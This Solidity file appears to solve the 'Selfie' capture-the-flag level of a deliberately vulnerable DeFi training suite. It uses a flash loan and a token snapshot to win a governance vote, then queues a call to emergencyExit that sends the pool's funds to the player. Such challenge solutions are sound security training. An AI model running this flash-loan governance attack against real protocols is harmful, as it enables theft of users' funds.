// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./ISimpleGovernance.sol";

// flashloans can be used to win votings

contract SelfieSolution is IERC3156FlashBorrower {
    SelfiePool public pool;
    ISimpleGovernance public gov;

    address public player;

    constructor(SelfiePool pool_, ISimpleGovernance gov_) {
        pool = pool_;
        gov = gov_;

        player = msg.sender;
    }

    function flashAndQueue() external {
        pool.flashLoan(this, address(pool.token()), 1500000 ether, "");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(token);
        token.approve(address(pool), amount);
        token.snapshot();

        queueAction();

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function queueAction() internal {
        bytes memory calldataPayload = abi.encodeWithSelector(pool.emergencyExit.selector, player);
        gov.queueAction(address(pool), 0, calldataPayload);
    }
}